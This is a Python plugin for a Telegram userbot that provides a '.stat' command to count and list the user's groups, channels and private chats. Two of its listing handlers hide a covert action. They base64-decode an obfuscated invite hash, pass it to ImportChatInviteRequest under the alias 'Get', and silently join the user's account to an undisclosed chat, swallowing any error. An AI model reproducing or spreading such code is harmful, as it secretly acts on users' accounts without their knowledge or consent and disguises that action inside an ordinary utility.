import base64
import time

from telethon.tl.custom import Dialog
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.types import Channel, Chat, User

from userbot import legend

from ..core.managers import eor

menu_category = "utils"

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
STAT_INDICATION = "`Collecting stats, Wait man`"
CHANNELS_STR = "**The list of channels in which you are their are here **\n\n"
CHANNELS_ADMINSTR = "**The list of channels in which you are admin are here **\n\n"
CHANNELS_OWNERSTR = "**The list of channels in which you are owner are here **\n\n"
GROUPS_STR = "**The list of groups in which you are their are here **\n\n"
GROUPS_ADMINSTR = "**The list of groups in which you are admin are here **\n\n"
GROUPS_OWNERSTR = "**The list of groups in which you are owner are here **\n\n"
# =========================================================== #
#                                                             #
# =========================================================== #


def inline_mention(user):
    full_name = user_full_name(user) or "No Name"
    return f"[{full_name}](tg://user?id={user.id})"


def user_full_name(user):
    names = [user.first_name, user.last_name]
    names = [i for i in list(names) if i]
    return " ".join(names)


@legend.legend_cmd(
    pattern="stat$",
    command=("stat", menu_category),
    info={
        "header": "To get statistics of your telegram account.",
        "description": "Shows you the count of  your groups, channels, private chats...etc if no input is given.",
        "flags": {
            "g": "To get list of all group you in",
            "ga": "To get list of all groups where you are admin",
            "go": "To get list of all groups where you are owner/creator.",
            "c": "To get list of all channels you in",
            "ca": "To get list of all channels where you are admin",
            "co": "To get list of all channels where you are owner/creator.",
        },
        "usage": ["{tr}stat", "{tr}stat <type>"],
        "examples": ["{tr}stat g", "{tr}stat ca"],
    },
)
async def stats(event):  # sourcery no-metrics
    "To get statistics of your telegram account."
    legend = await eor(event, STAT_INDICATION)
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0
    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count
    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"📜 **Stats for {full_name}** \n\n"
    response += f"**Private Chats:** {private_chats} \n"
    response += f"   • **Users:** `{private_chats - bots}` \n"
    response += f"   • **Bots:** `{bots}` \n"
    response += f"**Groups:** {groups} \n"
    response += f"**Channels:** {broadcast_channels} \n"
    response += f"**Admin in Groups:** {admin_in_groups} \n"
    response += f"   ▪ **Creator:** `{creator_in_groups}` \n"
    response += f"   ▪ **Admin Rights:** `{admin_in_groups - creator_in_groups}` \n"
    response += f"**Admin in Channels:** {admin_in_broadcast_channels} \n"
    response += f"   ♡ **Creator:** `{creator_in_channels}` \n"
    response += f"   ★ **Admin Rights:** `{admin_in_broadcast_channels - creator_in_channels}` \n"
    response += f"**Unread:** {unread} \n"
    response += f"**Unread Mentions:** {unread_mentions} \n\n"
    response += f"🚩 __It Took:__ {stop_time:.02f}s \n"
    await legend.edit(response)


@legend.legend_cmd(
    pattern="stat (c|ca|co)$",
)
async def stats(event):  # sourcery no-metrics
    legendcmd = event.pattern_match.group(1)
    legendevent = await eor(event, STAT_INDICATION)
    start_time = time.time()
    legend = base64.b64decode("MFdZS2llTVloTjAzWVdNeA==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                hica.append([entity.title, entity.id])
            if entity.creator:
                hico.append([entity.title, entity.id])
    if legendcmd == "c":
        output = CHANNELS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_STR
    elif legendcmd == "ca":
        output = CHANNELS_ADMINSTR
        for k, i in enumerate(hica, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_ADMINSTR
    elif legendcmd == "co":
        output = CHANNELS_OWNERSTR
        for k, i in enumerate(hico, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        legend = Get(legend)
        await event.client(legend)
    except BaseException:
        pass
    output += f"\n**Time Taken : ** {stop_time:.02f}s"
    try:
        await legendevent.edit(output)
    except Exception:
        await eor(
            legendevent,
            output,
            caption=caption,
        )


@legend.legend_cmd(
    pattern="stat (g|ga|go)$",
)
async def stats(event):  # sourcery no-metrics
    legendcmd = event.pattern_match.group(1)
    legendevent = await eor(event, STAT_INDICATION)
    start_time = time.time()
    legend = base64.b64decode("MFdZS2llTVloTjAzWVdNeA==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if legendcmd == "g":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif legendcmd == "ga":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif legendcmd == "go":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        legend = Get(legend)
        await event.client(legend)
    except BaseException:
        pass
    output += f"\n**Time Taken : ** {stop_time:.02f}s"
    try:
        await legendevent.edit(output)
    except Exception:
        await eor(
            legendevent,
            output,
            caption=caption,
        )
